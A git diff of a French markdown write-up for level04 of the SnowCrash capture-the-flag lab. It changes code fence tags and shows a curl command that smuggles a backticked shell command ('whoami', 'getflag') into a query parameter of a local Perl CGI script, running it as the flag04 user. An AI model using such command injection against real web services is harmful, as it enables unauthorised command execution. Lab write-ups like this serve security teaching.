@@ -2,7 +2,7 @@
 
 ## level04.pl
 
-```zsh
+```sh
 level04@SnowCrash:~$ ls -l
 total 4
 -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
@@ -31,11 +31,11 @@ Ainsi, le script level04.pl génère les paramètres transmis par l'utilisateur 
 
 Paramètres d'envoi
 
-```zsh
+```sh
 curl localhost:4747/?x=\`CMD\`
 ```
 
-```zsh
+```sh
 level04@SnowCrash:~$ curl "http://localhost:4747?x=\`whoami\`"
 flag04
 level04@SnowCrash:~$ curl "http://localhost:4747?x=\`getflag\`"
